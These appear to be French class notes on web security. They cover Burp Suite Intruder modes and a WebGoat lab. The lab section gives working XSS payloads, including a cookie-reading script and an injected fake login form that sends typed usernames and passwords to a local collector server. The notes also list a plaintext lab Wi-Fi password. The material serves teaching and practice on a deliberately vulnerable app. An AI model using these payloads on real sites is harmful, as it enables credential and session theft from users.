#<center>Cyber-Sécurité</center>

##Mise en jambes
Faites de l'analyse de risque pour déterminer si on fait de la sécurité

Qu'est ce qu'une donnée sensible?
Une adresse mail c'est pas forcement sensible
Il faut se référer au GDPR

Les num de carte doivent être sécurisés en toutes circonstances

**Pas de sur-sécurité**

On peut créer des analyses statiques qui vont étudier le code pour examiner les infos en dur dans le logiciel, les librairies, les fonctions etc.

https://networkmarketshare.com

Connexion à: ProxiaAP
mdp: abcdef1234

http://192.168.0.1:8081/WebGoat/attack

Ajouter plug in pour passer par un proxy

Télécharger Burpsuite

##Modes

*Exemple*: 
Original URL: `/search.php?cat_id=§123§&q=§hello§`
Payload: 

###Sniper:

Si j'ai défini plusieurs paramètres, ils vont prendre a tour de rôle les valeurs possibles définis.

###Battering ram

Les paramètres vont prendre la même valeur a chaque essai.

###Pitchfork

Si on a 2 paramètres j'ai 2 listes mais ils prennent la même ligne.

###Cluster bomb

Si on a 2 paramètres j'ai 2 listes en faisant toutes les combinaisons.



## TP

### Mise en place
Accéder au Hot-spot Wi-Fi ProxiaAP.
Configurer un proxy (FoxyProxy)
Dans BurpSuite configurer le proxy et setter l'*Intercerpt is off*

Accéder a l'adresse: http://192.168.0.1:8081/WebGoat/attack
et renseigner webgoat et webgoat pour les username et mdp.  

!!! tip
    Pour enlever les requettes non souhaitées dans Burp il faut clic droit sur une requête a garder, add to scope, puis clic sur filter, show only in-scope...

###Stage 5

Une fois renseigner le mdp qui est le prénom de l'employé on peut accéder a la barre de recherche.
Dans cette barre de recherche on y rentre un script: `<script>alert(document.cookie);</script>`
Ce script nous permet de renvoyer l'id de la session en cours.

On pourrait aussi renseigner une ligne HTML qui afficherais une image: `<img src="#" onerror="alert('hack');"/>`

Le code suivant permet d'afficher a l'utilisateur qui fait une recherche une erreur et un formulaire. En renseignant son username et son mot de passe l'utilisateur pense se connecter mais on extrait ses identifiants vers notre site web.

```html
Free softwares                    <hr />
<b>Only registered users are allowed to use our search feature to prevent bots</b>
<br></br>
Username:<br><input type="text" name="username"><br>
Password:<br><input type="text" name="password"><br>
<input type="submit" value="Login" 
onclick="window.open('http://http://127.0.0.1:81//?u='+this.form.username.value+'&p='+this.form.password.value);">
```

Pour essayer d'extraire ces données on va commencer par lancer un serveur http avec python `python.exe -m http.server 81`  
!!! Exemple 
    Si on accède maintenant à : http://localhost:81/ on voit sur notre shell une requête:`::ffff:127.0.0.1 - - [23/Oct/2020 09:47:34] "GET / HTTP/1.1" 200 -`  
    Dans la suite on récupérera les identifiants de l'utilisateur leurré via ces requêtes.


